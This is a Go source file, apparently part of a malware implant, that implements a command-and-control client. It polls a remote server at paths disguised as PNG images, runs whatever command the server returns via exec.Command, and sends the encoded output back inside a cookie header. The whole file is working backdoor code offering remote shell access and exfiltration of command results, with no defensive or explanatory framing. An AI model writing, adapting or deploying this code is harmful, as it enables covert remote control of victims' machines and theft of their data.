package utils

import (
	"io"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

func PollCommands(debug bool, server string, guid string) error {
	var url string = server + "/images/c/cp.png"
	client := &http.Client{}
	for {
		PrintDebug(debug, "Asking for command to %s", url)
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("cookie", guid+"=")
		res, err := client.Do(req)
		if err != nil {
			PrintDebug(debug, "Error getting commands from %s\n%v", url, err)
			return err
		}
		if res.StatusCode == 200 {
			defer res.Body.Close()
			body, err := io.ReadAll(res.Body)
			if err == nil {
				ExecuteAndRespond(debug, server, guid, body)
			}
		}
		time.Sleep(10 * time.Second)
	}
	return nil
}

func ExecC2Shell(debug bool, server string, guid string) error {
	var url string = server + "/images/c/cm.png"
	PrintDebug(debug, "Asking for command to %s", url)
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("cookie", guid+"=")
	res, err := client.Do(req)
	if err != nil {
		PrintDebug(debug, "Error getting commands from %s\n%v", url, err)
		return err
	}
	defer res.Body.Close()
	body, err := io.ReadAll(res.Body)
	err = ExecuteAndRespond(debug, server, guid, body)
	return err
}

func ExecuteAndRespond(debug bool, server string, guid string, body []byte) error {
	var (
		url  = server + "/images/c/cr.png"
		err  error
		cmd  *exec.Cmd
		data string
	)
	PrintDebug(debug, "Executing command: %s", strings.Replace(string(body), ":", " ", -1))
	commands := strings.Split(string(body), ":")
	cmd = exec.Command(commands[0], commands[1:]...)
	output, _ := cmd.CombinedOutput()
	PrintDebug(debug, "_ "+string(output))

	// upload this to the server
	data, _ = EncodeString(debug, string(output))
	PrintDebug(debug, "Uploading output to %s", url)
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("cookie", guid+"="+data)
	_, err = client.Do(req)
	return err
}
